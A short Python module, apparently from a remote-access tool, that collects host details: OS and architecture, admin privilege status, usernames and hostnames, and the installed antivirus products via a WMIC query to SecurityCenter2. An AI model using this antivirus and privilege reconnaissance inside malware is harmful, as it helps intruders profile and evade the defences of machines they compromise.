import platform
import getpass

from foreign.privileges.win_privileges import *
from foreign.utility.terminal_pipe import *


def system_info(extra_data):
  system_obj = {}

  try:
    system = platform.uname()
    machine = system.machine.lower()

    if machine == 'i386':
      architecture = '32-bit'
    elif machine == 'amd64':
      architecture = '64-bit'
    else:
      architecture = '???'

    system_obj['os'] = f'{system.system} {system.release} {architecture}'
  except:
    system_obj['os'] = f'???'

  try:
    if is_running_as_admin():
      system_obj['privileges'] = 'Administrator'
    else:
      system_obj['privileges'] = 'User'
  except:
    system_obj['privileges'] = '???'

  try:
    powershell_command = r'powershell WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List'
    system_obj['antivirus'] = ', '.join([antivirus.strip() for antivirus in terminal_pipe(powershell_command, extra_data[0], extra_data[1]).split('displayName=') if antivirus != ''])

    if system_obj['antivirus'] == '':
      system_obj['antivirus'] = 'No Antivirus Activated'
  except:
    system_obj['antivirus'] = '???'

  try:
    hostname = system.node
  except:
    hostname = 'Unkown'

  try:
    system_obj['username'] = f'{getpass.getuser().capitalize()}@{hostname}'
  except:
    system_obj['username'] = f'Unkown@{hostname}'
  
  return system_obj